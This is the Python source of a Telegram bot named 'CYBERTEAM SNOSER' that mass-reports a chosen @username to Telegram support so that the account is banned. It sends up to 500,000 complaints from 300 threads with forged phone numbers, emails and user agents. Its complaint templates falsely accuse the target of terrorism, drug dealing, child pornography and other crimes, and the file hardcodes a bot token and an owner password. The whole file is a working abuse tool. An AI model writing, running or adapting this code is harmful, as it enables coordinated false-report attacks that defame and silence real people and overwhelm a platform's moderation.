import os
import sys
import time
import random
import string
import threading
import subprocess
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

# ===================================================================
# ТВОИ ДАННЫЕ
# ===================================================================
ТВОЙ_ТОКЕН = "8677746039:AAEruPyB_19dCamkVr5u1H2NctcCfnRgems"
ТВОЙ_ID = 7823802800

# ===================================================================
# FLASK APP
# ===================================================================
app = Flask(__name__)

@app.route('/')
def home():
    return "☢️ CYBERTEAM SNOSER v24.0 - STATS EDITION"

@app.route('/health')
def health():
    return "OK"

# ===================================================================
# ПРОВЕРКА МОДУЛЕЙ
# ===================================================================
required_modules = ["requests", "fake_useragent", "termcolor", "pyfiglet", "flask"]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    print("=" * 60)
    print("☢️ CYBERTEAM SNOSER v24.0 ☢️")
    print("=" * 60)
    print("🔥 ЖИВАЯ СТАТИСТИКА")
    print("💥 ДО 500.000 УДАРОВ")
    print("=" * 60)
    
    for module in required_modules:
        try:
            __import__(module)
            print(f"✅ {module} уже установлен.")
        except:
            print(f"⏳ Установка {module}...")
            install(module)
            print(f"✅ {module} установлен.")
    
    print("=" * 60)
    print("✅ ВСЕ ГОТОВО!")

check_and_install_modules()

# ===================================================================
# ИМПОРТЫ
# ===================================================================
import requests
from fake_useragent import UserAgent

# ===================================================================
# КОНФИГ
# ===================================================================
CONFIG = {
    "threads": 300,
    "request_timeout": 15,
    "delay_min": 0.03,
    "delay_max": 0.1,
    "mode": "tornado",
    "owner_password": "cyberteam2024",
    "bot_token": ТВОЙ_ТОКЕН,
    "owner_id": ТВОЙ_ID,
    "attack_running": False,
    "current_target": "",
    "history": [],
    "last_update_id": 0,
    "awaiting_target": False,
    "awaiting_repeats": False,
    "awaiting_password": False,
    "awaiting_chat": None,
    "user_roles": {}
}

# ===================================================================
# ГЕНЕРАТОРЫ
# ===================================================================
class Generators:
    @staticmethod
    def phone():
        codes = ['+7', '+380', '+375', '+1', '+44', '+49']
        return f"{random.choice(codes)}{''.join(random.choices('0123456789', k=10))}"
    
    @staticmethod
    def email():
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'mail.ru', 'yandex.ru']
        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
        return f"{name}{random.randint(1, 999)}@{random.choice(domains)}"
    
    @staticmethod
    def user_agent():
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        return random.choice(agents)

# ===================================================================
# ТЕКСТЫ ДЛЯ СНОСА
# ===================================================================
class TextTemplates:
    
    TEXTS = {
        "spam": [
            "Аккаунт {target} занимается МАССОВЫМ СПАМОМ! Получаю по 30 сообщений в день! Прошу заблокировать!",
            "{target} - СЕРИЙНЫЙ СПАМЕР! Рассылает рекламу криптовалют! Заблокируйте немедленно!",
        ],
        "insult": [
            "Аккаунт {target} ОСКОРБЛЯЕТ пользователей каждый день! Нецензурная брань и унижения!",
            "{target} - АГРЕССОР! Оскорбляет всех в чатах без причины!",
        ],
        "scam": [
            "Аккаунт {target} - МОШЕННИК! Обманул уже 30 человек на крупные суммы!",
            "{target} продает фейковые товары и исчезает с деньгами!",
        ],
        "illegal": [
            "Аккаунт {target} распространяет НЕЛЕГАЛЬНЫЙ контент! Нарушает закон РФ!",
            "{target} продает НАРКОТИКИ! Статья 228.1 УК РФ!",
        ],
        "fake": [
            "Аккаунт {target} использует ВИРТУАЛЬНЫЙ НОМЕР! Это фейковый аккаунт!",
            "{target} зарегистрирован на одноразовый номер. Это мошенник 100%!",
        ],
        "doxxing": [
            "Аккаунт {target} занимается ДОКСИНГОМ! Сливает личные данные людей!",
            "{target} публикует паспортные данные, адреса и номера телефонов!",
        ],
        "terror": [
            "Аккаунт {target} призывает к ТЕРРОРИЗМУ! Статья 205.2 УК РФ!",
            "{target} - ТЕРРОРИСТИЧЕСКИЙ аккаунт! Публикует инструкции по взрывчатке!",
        ],
        "drugs": [
            "Аккаунт {target} продает НАРКОТИКИ! Статья 228.1 УК РФ!",
            "{target} - НАРКО-ДИЛЕР! Торгует запрещенными веществами!",
        ],
        "child_porn": [
            "Аккаунт {target} распространяет ДЕТСКУЮ ПОРНОГРАФИЮ! Статья 242.1 УК РФ!",
            "{target} - ПЕДОФИЛ! Торгует фото и видео с детьми!",
        ],
        "violence": [
            "Аккаунт {target} призывает к НАСИЛИЮ! Статья 119 УК РФ!",
            "{target} - АГРЕССОР! Призывает к избиению людей!",
        ],
        "hate": [
            "Аккаунт {target} РАЗЖИГАЕТ НЕНАВИСТЬ! Статья 282 УК РФ!",
            "{target} - НАЦИСТ! Публикует расистские посты!",
        ],
        "harassment": [
            "Аккаунт {target} - ДОМОГАТЕЛЬ! Преследует людей в чатах!",
            "{target} - СТАЛКЕР! Следит за людьми и пишет угрозы!",
        ],
        "impersonation": [
            "Аккаунт {target} - ПОДДЕЛЬНЫЙ! Выдает себя за известную личность!",
            "{target} - ФЕЙК! Притворяется сотрудником Telegram!",
        ],
        "bot": [
            "Аккаунт {target} - НЕЛЕГАЛЬНЫЙ БОТ! Нарушает правила Telegram!",
            "{target} - БОТ-СПАМЕР! Отправляет тысячи сообщений!",
        ]
    }
    
    REASON_LIST = [
        ("💀 Спам", "spam"),
        ("😡 Оскорбление", "insult"),
        ("💰 Мошенничество", "scam"),
        ("🚫 Нелегальный контент", "illegal"),
        ("🎭 Фейк", "fake"),
        ("🔓 Доксинг", "doxxing"),
        ("💣 Терроризм", "terror"),
        ("💊 Наркотики", "drugs"),
        ("🔞 Детское порно", "child_porn"),
        ("⚔️ Насилие", "violence"),
        ("👿 Ненависть", "hate"),
        ("🕵️ Преследование", "harassment"),
        ("🎭 Самозванство", "impersonation"),
        ("🤖 Нелегальный бот", "bot")
    ]
    
    @staticmethod
    def get_text(target, reason):
        texts = TextTemplates.TEXTS.get(reason, TextTemplates.TEXTS["spam"])
        return random.choice(texts).format(target=target)
    
    @staticmethod
    def get_reason_menu():
        keyboard = []
        for label, value in TextTemplates.REASON_LIST:
            keyboard.append([{"text": label, "callback_data": f"reason_{value}"}])
        keyboard.append([{"text": "⬅️ НАЗАД", "callback_data": "back"}])
        return keyboard

# ===================================================================
# ГЛОБАЛЬНАЯ СТАТИСТИКА
# ===================================================================
class AttackStats:
    
    @staticmethod
    def get_live_stats(target, reason, method, sent, success, failed, total):
        """Возвращает живую статистику для бота"""
        progress = int((sent / total) * 100) if total > 0 else 0
        bar = "█" * int(progress / 2) + "░" * (50 - int(progress / 2))
        
        return f"""
💥 <b>СТАТИСТИКА АТАКИ</b>

🎯 ЦЕЛЬ: {target}
🔥 ПРИЧИНА: {reason.upper()}
📡 МЕТОД: {method.upper()}

📊 ПРОГРЕСС: {progress}%
[{bar}]

📨 ОТПРАВЛЕНО: {sent:,}/{total:,}
✅ УСПЕШНО: {success:,}
❌ ОШИБОК: {failed:,}
🎯 УСПЕШНОСТЬ: {int((success/sent)*100) if sent > 0 else 0}%

⏱️ ВРЕМЯ: {datetime.now().strftime('%H:%M:%S')}
"""
    
    @staticmethod
    def get_final_stats(target, reason, method, sent, success, failed, total, destroyed):
        status = "✅ УНИЧТОЖЕН" if destroyed else "❌ ВЫЖИЛ"
        return f"""
💥 <b>АТАКА ЗАВЕРШЕНА!</b>

🎯 ЦЕЛЬ: {target}
🔥 ПРИЧИНА: {reason.upper()}
📡 МЕТОД: {method.upper()}

📨 ВСЕГО: {sent:,}
✅ УСПЕШНО: {success:,}
❌ ОШИБОК: {failed:,}
🎯 УСПЕШНОСТЬ: {int((success/sent)*100) if sent > 0 else 0}%

💀 СТАТУС: {status}
"""

# ===================================================================
# ОСНОВНОЙ ДВИЖОК СНОСА (С ЖИВОЙ СТАТИСТИКОЙ)
# ===================================================================
class SnosEngine:
    
    @staticmethod
    def send_complaint(target, reason, method):
        """Отправляет жалобу"""
        text = TextTemplates.get_text(target, reason)
        text += f" {Generators.user_agent()[:15]}"
        
        phone = Generators.phone()
        email = Generators.email()
        
        url = 'https://telegram.org/support'
        data = {'text': text, 'number': phone, 'email': email}
        headers = {'User-Agent': Generators.user_agent()}
        
        try:
            response = requests.post(url, headers=headers, data=data, timeout=CONFIG["request_timeout"])
            return response.status_code == 200
        except:
            return False
    
    @staticmethod
    def snos_target(target, reason, method, repeats, chat_id):
        """Снос с живой статистикой"""
        success = 0
        failed = 0
        lock = threading.Lock()
        total = repeats
        sent = 0
        
        print(f"\n🎯 ЦЕЛЬ: {target}")
        print(f"🔥 ПРИЧИНА: {reason.upper()}")
        print(f"📡 МЕТОД: {method.upper()}")
        print(f"💥 ЖАЛОБ: {total:,}")
        
        def worker(index):
            nonlocal success, failed, sent
            result = SnosEngine.send_complaint(target, reason, method)
            
            with lock:
                sent += 1
                if result:
                    success += 1
                else:
                    failed += 1
                
                # Отправляем обновление статистики каждые 100 жалоб
                if sent % 100 == 0 or sent == total:
                    stats = AttackStats.get_live_stats(
                        target, reason, method, sent, success, failed, total
                    )
                    send_telegram_message(chat_id, stats)
            
            time.sleep(random.uniform(CONFIG["delay_min"], CONFIG["delay_max"]))
        
        with ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
            executor.map(worker, range(total))
        
        is_destroyed = success > total * 0.6
        
        # Финальная статистика
        final_stats = AttackStats.get_final_stats(
            target, reason, method, sent, success, failed, total, is_destroyed
        )
        send_telegram_message(chat_id, final_stats)
        
        CONFIG['history'].append({
            'target': target,
            'reason': reason,
            'method': method,
            'success': success,
            'total': total,
            'destroyed': is_destroyed,
            'time': datetime.now().strftime('%H:%M')
        })
        
        CONFIG['attack_running'] = False
        CONFIG['current_target'] = ""
        
        return is_destroyed

# ===================================================================
# ОТПРАВКА СООБЩЕНИЙ В TELEGRAM
# ===================================================================
def send_telegram_message(chat_id, text, keyboard=None):
    try:
        url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        if keyboard:
            data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
        requests.post(url, data=data, timeout=5)
    except:
        pass

# ===================================================================
# КЛАВИАТУРЫ
# ===================================================================
def role_menu():
    return [
        [{"text": "👑 ВЛАДЕЛЕЦ", "callback_data": "role_owner"}],
        [{"text": "👤 ГОСТЬ", "callback_data": "role_guest"}]
    ]

def main_menu(role):
    if role == "owner":
        return [
            [{"text": "💥 СНОС", "callback_data": "snos"}],
            [{"text": "📊 СТАТИСТИКА", "callback_data": "stats"},
             {"text": "📜 ИСТОРИЯ", "callback_data": "history"}],
            [{"text": "📋 ЛОГИ", "callback_data": "logs"},
             {"text": "⚙️ НАСТРОЙКИ", "callback_data": "settings"}],
            [{"text": "🛑 СТОП", "callback_data": "stop"},
             {"text": "🚪 ВЫЙТИ", "callback_data": "logout"}]
        ]
    else:
        return [
            [{"text": "💥 СНОС", "callback_data": "snos"}],
            [{"text": "📊 СТАТИСТИКА", "callback_data": "stats"},
             {"text": "📜 ИСТОРИЯ", "callback_data": "history"}],
            [{"text": "🚪 ВЫЙТИ", "callback_data": "logout"}]
        ]

def method_menu(target, reason):
    return [
        [{"text": "🌐 ВСЕ МЕТОДЫ", "callback_data": f"method_all_{target}_{reason}"}],
        [{"text": "📝 ТОЛЬКО ФОРМА", "callback_data": f"method_form_{target}_{reason}"}],
        [{"text": "📱 ТОЛЬКО НОМЕРА", "callback_data": f"method_phone_{target}_{reason}"}],
        [{"text": "✉️ ТОЛЬКО ПОЧТЫ", "callback_data": f"method_email_{target}_{reason}"}],
        [{"text": "⬅️ НАЗАД", "callback_data": "back"}]
    ]

def repeats_menu(target, reason, method):
    return [
        [{"text": "💥 100", "callback_data": f"run_{target}_{reason}_{method}_100"}],
        [{"text": "💥 500", "callback_data": f"run_{target}_{reason}_{method}_500"}],
        [{"text": "💥 1.000", "callback_data": f"run_{target}_{reason}_{method}_1000"}],
        [{"text": "💥 5.000", "callback_data": f"run_{target}_{reason}_{method}_5000"}],
        [{"text": "💥 10.000", "callback_data": f"run_{target}_{reason}_{method}_10000"}],
        [{"text": "💥 50.000", "callback_data": f"run_{target}_{reason}_{method}_50000"}],
        [{"text": "💥 100.000", "callback_data": f"run_{target}_{reason}_{method}_100000"}],
        [{"text": "🔥 500.000", "callback_data": f"run_{target}_{reason}_{method}_500000"}],
        [{"text": "⬅️ НАЗАД", "callback_data": f"back_method_{target}_{reason}"}]
    ]

def settings_menu():
    return [
        [{"text": f"⚡ РЕЖИМ: {CONFIG['mode'].upper()}", "callback_data": "toggle_mode"}],
        [{"text": f"🌊 ПОТОКИ: {CONFIG['threads']}", "callback_data": "toggle_threads"}],
        [{"text": "⬅️ НАЗАД", "callback_data": "back"}]
    ]

# ===================================================================
# ОБРАБОТЧИК КНОПОК
# ===================================================================
def process_callback(chat_id, callback_data):
    role = CONFIG['user_roles'].get(chat_id, "guest")
    
    if callback_data == "logout":
        CONFIG['user_roles'].pop(chat_id, None)
        send_telegram_message(chat_id, "👋 ВЫ ВЫШЛИ", role_menu())
        return
    
    if callback_data == "role_owner":
        send_telegram_message(chat_id, "👑 ВВЕДИ ПАРОЛЬ")
        CONFIG['awaiting_password'] = True
        CONFIG['awaiting_chat'] = chat_id
        return
    
    if callback_data == "role_guest":
        CONFIG['user_roles'][chat_id] = "guest"
        send_telegram_message(chat_id, "👤 ВЫ ВОШЛИ КАК ГОСТЬ", main_menu("guest"))
        return
    
    if callback_data == "back":
        send_telegram_message(chat_id, "☢️ ГЛАВНОЕ МЕНЮ", main_menu(role))
        return
    
    if callback_data == "snos":
        send_telegram_message(chat_id, "🎯 ВВЕДИ @USERNAME")
        CONFIG['awaiting_target'] = True
        CONFIG['awaiting_chat'] = chat_id
        return
    
    if callback_data.startswith("reason_"):
        reason = callback_data.split('_')[1]
        target = CONFIG.get('temp_target', '')
        send_telegram_message(chat_id, f"📡 ВЫБЕРИ МЕТОД СНОСА\n\n🎯 {target}\n🔥 {reason.upper()}", method_menu(target, reason))
        return
    
    if callback_data.startswith("back_method_"):
        _, _, target, reason = callback_data.split('_', 3)
        send_telegram_message(chat_id, f"🎯 ВЫБЕРИ ПРИЧИНУ\n\n👤 {target}", TextTemplates.get_reason_menu())
        return
    
    if callback_data.startswith("method_"):
        parts = callback_data.split('_')
        method = parts[1]
        target = parts[2]
        reason = parts[3]
        send_telegram_message(chat_id, f"💥 ВЫБЕРИ КОЛИЧЕСТВО\n\n🎯 {target}\n🔥 {reason.upper()}\n📡 {method.upper()}", repeats_menu(target, reason, method))
        return
    
    if callback_data == "stats":
        total = len(CONFIG['history'])
        destroyed = sum(1 for h in CONFIG['history'] if h.get('destroyed', False))
        rate = int((destroyed / total) * 100) if total > 0 else 0
        
        # Считаем общее количество отправленных жалоб
        total_sent = sum(h.get('total', 0) for h in CONFIG['history'])
        total_success = sum(h.get('success', 0) for h in CONFIG['history'])
        
        send_telegram_message(chat_id, f"""
📊 <b>ОБЩАЯ СТАТИСТИКА</b>

📨 ВСЕГО СНОСОВ: {total:,}
💥 ВСЕГО ЖАЛОБ: {total_sent:,}
✅ УСПЕШНЫХ: {total_success:,}
💀 УНИЧТОЖЕНО ЦЕЛЕЙ: {destroyed:,}
🎯 ОБЩАЯ УСПЕШНОСТЬ: {rate}%

⚡ РЕЖИМ: {CONFIG['mode'].upper()}
🌊 ПОТОКОВ: {CONFIG['threads']}
""")
        return
    
    if callback_data == "history":
        if not CONFIG['history']:
            send_telegram_message(chat_id, "📜 ИСТОРИЯ ПУСТА")
            return
        msg = "📜 <b>ПОСЛЕДНИЕ 10 СНОСОВ</b>\n\n"
        for i, h in enumerate(reversed(CONFIG['history'][-10:]), 1):
            status = "✅ УНИЧТОЖЕН" if h.get('destroyed', False) else "❌ ВЫЖИЛ"
            msg += f"{i}. {h['target']} [{h.get('method', 'all')}] — {h['success']:,}/{h['total']:,} {status}\n"
        send_telegram_message(chat_id, msg)
        return
    
    if callback_data == "logs":
        if role != "owner":
            send_telegram_message(chat_id, "⛔ ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА")
            return
        if not CONFIG['history']:
            send_telegram_message(chat_id, "📋 ЛОГИ ПУСТЫ")
            return
        msg = "📋 <b>ПОЛНЫЕ ЛОГИ</b>\n\n"
        for h in CONFIG['history'][-10:]:
            status = "✅ УНИЧТОЖЕН" if h.get('destroyed', False) else "❌ ВЫЖИЛ"
            msg += f"• {h['time']} | {h['target']} | {h.get('method', 'all')} | {h['success']:,}/{h['total']:,} | {status}\n"
        send_telegram_message(chat_id, msg)
        return
    
    if callback_data == "settings":
        if role != "owner":
            send_telegram_message(chat_id, "⛔ ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА")
            return
        send_telegram_message(chat_id, "⚙️ НАСТРОЙКИ", settings_menu())
        return
    
    if callback_data == "stop":
        if CONFIG['attack_running']:
            CONFIG['attack_running'] = False
            send_telegram_message(chat_id, "🛑 СНОС ОСТАНОВЛЕН")
        else:
            send_telegram_message(chat_id, "ℹ️ СНОС НЕ ЗАПУЩЕН")
        return
    
    if callback_data == "toggle_mode":
        modes = ["normal", "spam", "tornado"]
        CONFIG['mode'] = modes[(modes.index(CONFIG['mode']) + 1) % len(modes)]
        send_telegram_message(chat_id, f"✅ РЕЖИМ: {CONFIG['mode'].upper()}", settings_menu())
        return
    
    if callback_data == "toggle_threads":
        options = [50, 100, 200, 300, 500]
        current = CONFIG['threads']
        CONFIG['threads'] = options[(options.index(current) + 1) % len(options)] if current in options else options[0]
        send_telegram_message(chat_id, f"✅ ПОТОКОВ: {CONFIG['threads']}", settings_menu())
        return
    
    if callback_data.startswith("run_"):
        parts = callback_data.split('_')
        target = parts[1]
        reason = parts[2]
        method = parts[3]
        repeats = int(parts[4])
        
        if CONFIG['attack_running']:
            send_telegram_message(chat_id, "⚠️ СНОС УЖЕ ИДЕТ")
            return
        
        CONFIG['attack_running'] = True
        CONFIG['current_target'] = target
        
        # Отправляем стартовое сообщение
        send_telegram_message(chat_id, f"""
💥 <b>СНОС ЗАПУЩЕН!</b>

🎯 ЦЕЛЬ: {target}
🔥 ПРИЧИНА: {reason.upper()}
📡 МЕТОД: {method.upper()}
💥 ЖАЛОБ: {repeats:,}
🌊 ПОТОКОВ: {CONFIG['threads']}

⏳ ОТПРАВЛЯЮ...
""")
        
        def run():
            SnosEngine.snos_target(target, reason, method, repeats, chat_id)
            CONFIG['attack_running'] = False
        
        threading.Thread(target=run, daemon=True).start()
        return

# ===================================================================
# ОБРАБОТЧИК ТЕКСТА
# ===================================================================
def process_text(chat_id, text):
    if CONFIG.get('awaiting_password', False):
        CONFIG['awaiting_password'] = False
        if text == CONFIG['owner_password']:
            CONFIG['user_roles'][chat_id] = "owner"
            send_telegram_message(chat_id, "👑 ВЫ ВОШЛИ КАК ВЛАДЕЛЕЦ", main_menu("owner"))
        else:
            send_telegram_message(chat_id, "❌ НЕВЕРНЫЙ ПАРОЛЬ", role_menu())
        return
    
    if CONFIG.get('awaiting_target', False):
        CONFIG['awaiting_target'] = False
        target = text
        CONFIG['temp_target'] = target
        
        msg = f"🎯 <b>ВЫБЕРИ ПРИЧИНУ</b>\n\n👤 {target}"
        send_telegram_message(chat_id, msg, TextTemplates.get_reason_menu())
        return
    
    if text.startswith('/start'):
        role = CONFIG['user_roles'].get(chat_id)
        if role == "owner":
            send_telegram_message(chat_id, "👑 ДОБРО ПОЖАЛОВАТЬ", main_menu("owner"))
        elif role == "guest":
            send_telegram_message(chat_id, "👤 ДОБРО ПОЖАЛОВАТЬ", main_menu("guest"))
        else:
            send_telegram_message(chat_id, "☢️ CYBERTEAM SNOSER\n\nВыберите роль:", role_menu())
        return

# ===================================================================
# ПОЛЛИНГ БОТА
# ===================================================================
def polling_bot():
    print("🤖 БОТ ЗАПУЩЕН")
    print("📊 ЖИВАЯ СТАТИСТИКА ВКЛЮЧЕНА")
    print("💥 ДО 500.000 УДАРОВ")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/getUpdates"
            params = {
                "offset": CONFIG['last_update_id'] + 1,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"]
            }
            
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        CONFIG['last_update_id'] = update['update_id']
                        
                        if 'callback_query' in update:
                            callback = update['callback_query']
                            chat_id = callback['message']['chat']['id']
                            data = callback['data']
                            process_callback(chat_id, data)
                            
                            answer_url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/answerCallbackQuery"
                            requests.post(answer_url, data={"callback_query_id": callback['id']})
                        
                        elif 'message' in update and 'text' in update['message']:
                            chat_id = update['message']['chat']['id']
                            text = update['message']['text']
                            process_text(chat_id, text)
            else:
                print(f"⚠️ Ошибка: {response.status_code}")
                
        except Exception as e:
            print(f"⚠️ Ошибка: {e}")
        
        time.sleep(1)

# ===================================================================
# ЗАПУСК
# ===================================================================
if __name__ == "__main__":
    print("\n☢️ CYBERTEAM SNOSER v24.0")
    print("📊 ЖИВАЯ СТАТИСТИКА ВКЛЮЧЕНА")
    print("💥 ДО 500.000 УДАРОВ")
    print("=" * 60)
    
    bot_thread = threading.Thread(target=polling_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)